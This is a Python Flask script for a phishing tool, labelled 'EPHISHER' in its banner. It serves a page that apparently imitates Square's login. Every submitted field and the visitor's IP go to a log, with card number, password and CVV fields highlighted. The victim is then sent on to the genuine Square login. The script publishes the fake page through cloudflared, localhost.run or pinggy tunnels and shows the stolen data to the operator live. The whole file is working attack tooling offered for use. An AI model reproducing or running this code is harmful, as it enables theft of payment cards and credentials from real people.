import os
import subprocess
import threading
import time
from flask import Flask, render_template, request, redirect

# --- Configuration ---
app = Flask(__name__)
PORT = 8080
LOG_FILE = '/root/log.txt'

# --- HD Color Palette ---
P = '\033[38;5;93m'    # Purple
DB = '\033[38;5;18m'   # Dark Blue
LB = '\033[38;5;33m'   # Light Blue
R = '\033[38;5;196m'   # Red
W = '\033[38;5;255m'   # White
G = '\033[1;32m'       # Green
Y = '\033[38;5;226m'   # Yellow
NC = '\033[0m'         # Reset
BOLD = '\033[1m'

# --- Flask Routes ---
@app.route('/')
def index():
    return render_template('square.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.form.to_dict()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    timestamp = time.strftime('%H:%M:%S')

    with open(LOG_FILE, 'a') as f:
        f.write(f"\n{Y}[!!!] HIT DETECTED | {timestamp} | IP: {ip} [!!!]{NC}\n")
        f.write(f"{P}┌────────────────────────────────────────────────┐{NC}\n")
        for k, v in data.items():
            color = R if any(x in k.lower() for x in ['card', 'pass', 'cvv']) else LB
            f.write(f"  {P}│{NC} {color}{k.upper():<12}{NC} : {W}{v}{NC}\n")
        f.write(f"{P}└────────────────────────────────────────────────┘{NC}\n")
    return redirect("https://squareup.com/login")

# --- Menu & Logic Functions ---
def run_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

def clear():
    os.system('clear')

def get_ip():
    try:
        return os.popen("ip addr show | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}' | grep -v '127.0.0.1' | head -n 1").read().strip()
    except:
        return "127.0.0.1"

def start_tunnel(choice):
    cmd = ""
    if choice == '1':
        cmd = f"nohup cloudflared tunnel --url http://localhost:{PORT} > /root/link.txt 2>&1 &"
    elif choice == '2':
        cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{PORT} nokey@localhost.run > /root/link.txt 2>&1 &"
    elif choice == '3':
        cmd = f"ssh -p 443 -o StrictHostKeyChecking=no -R0:localhost:{PORT} a.pinggy.io > /root/link.txt 2>&1 &"

    if cmd:
        os.system(cmd)
        print(f"\n{Y}Starting Tunnel... Please wait.{NC}")
        time.sleep(8)
        url = os.popen("grep -oE 'https?://[a-zA-Z0-9.-]+\\.(trycloudflare\\.com|lhr\\.life|pinggy\\.link)' /root/link.txt | head -n 1").read().strip()
        return url
    return None

def main_menu():
    clear()
    print(f"{P}╔══════════════════════════════════════════════════════════════════╗{NC}")
    print(f"{P}║{NC} {DB}███████ ██████  ██   ██ ██ ███████ ██   ██ ███████ ██████  {NC}{P}║{NC}")
    print(f"{P}║{NC} {DB}██      ██   ██ ██   ██ ██ ██      ██   ██ ██      ██   ██ {NC}{P}║{NC}")
    print(f"{P}║{NC} {P}█████   ██████  ███████ ██ ███████ ███████ █████   ██████  {NC}{P}║{NC}")
    print(f"{P}║{NC} {R}██      ██      ██   ██ ██      ██ ██   ██ ██      ██   ██ {NC}{P}║{NC}")
    print(f"{P}║{NC} {R}███████ ██      ██   ██ ██ ███████ ██   ██ ███████ ██   ██ {NC}{P}║{NC}")
    print(f"{P}╠══════════════════════════════════════════════════════════════════╣{NC}")
    print(f"{P}║{NC}  {W}{BOLD}STATUS:{NC} {G}ONLINE{NC} {R}●{NC}                       {W}{BOLD}PORT:{NC} {LB}{PORT}{NC}        {P}║{NC}")
    print(f"{P}╠══════════════════════════════════════════════════════════════════╣{NC}")
    print(f"{P}║{NC}                                                                  {P}║{NC}")
    print(f"{P}║{NC}  {LB}[1]{NC} Cloudflared         {LB}[2]${NC} Localhost.run                  {P}║{NC}")
    print(f"{P}║{NC}  {LB}[3]${NC} Pinggy.io           {R}[4]  EXIT COMMAND CENTER            {P}║{NC}")
    print(f"{P}║{NC}                                                                  {P}║{NC}")
    print(f"{P}╚══════════════════════════════════════════════════════════════════╝{NC}")

    choice = input(f"\n  {P}SELECTION » {NC}")
    if choice == '4':
        os.system("pkill -9 python")
        return

    public_url = start_tunnel(choice)
    local_ip = get_ip()

    clear()
    print(f"{P}╔══════════════════════════════════════════════════════════════════╗{NC}")
    print(f"{P}║{NC} {W}{BOLD}                   EPHISHER LIVE DATA STREAM                    {NC} {P}║{NC}")
    print(f"{P}╚══════════════════════════════════════════════════════════════════╝{NC}")
    print(f"{DB} NETWORK IP  : {NC}{W}http://{local_ip}:{PORT}{NC}")
    print(f"{LB} PUBLIC URL  : {NC}{G}{BOLD}{public_url}{NC}")
    print(f"{P}────────────────────────────────────────────────────────────────────{NC}")
    print(f"{R}{BOLD} [!] LISTENING FOR INCOMING DATA...{NC}\n")

    # This keeps the menu open and shows logs
    os.system(f"tail -f {LOG_FILE}")

if __name__ == '__main__':
    # Clean up old processes
    os.system("pkill -f cloudflared; pkill -f ssh; touch /root/log.txt")

    # Start Flask in a background thread
    threading.Thread(target=run_flask, daemon=True).start()

    # Start the Interactive Menu in the main thread
    main_menu()
